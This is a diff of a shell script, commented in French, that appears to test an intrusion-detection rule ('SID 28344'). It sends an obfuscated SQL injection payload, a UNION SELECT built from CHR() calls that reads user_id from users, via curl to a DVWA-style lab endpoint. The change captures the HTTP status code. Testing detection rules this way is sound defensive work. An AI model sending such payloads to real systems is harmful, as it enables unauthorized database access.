@@ -62,8 +62,8 @@ echo "[*] Étape 6 : Envoi du payload d'obfuscation SQL (Trigger SID 28344)..."
 PAYLOAD_OBFUSCATED="%27%20UNION%20SELECT%20CHR(115)||CHR(101)||CHR(108)||CHR(101)||CHR(99)||CHR(116),user_id%20FROM%20users--%20"
 
 # Exécution de la requête cURL
-curl -v -H "Cookie: PHPSESSID=${PHPSESSID}" \
-     "${BASE_URL}/vulnerabilities/sqli/?id=${PAYLOAD_OBFUSCATED}&Submit=Submit"
+RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Cookie: PHPSESSID=${PHPSESSID}" \
+     "${BASE_URL}/vulnerabilities/sqli/?${PAYLOAD_OBFUSCATED}")
 
 
 echo "[+] Requête envoyée. Code retour HTTP du serveur : $RESPONSE"
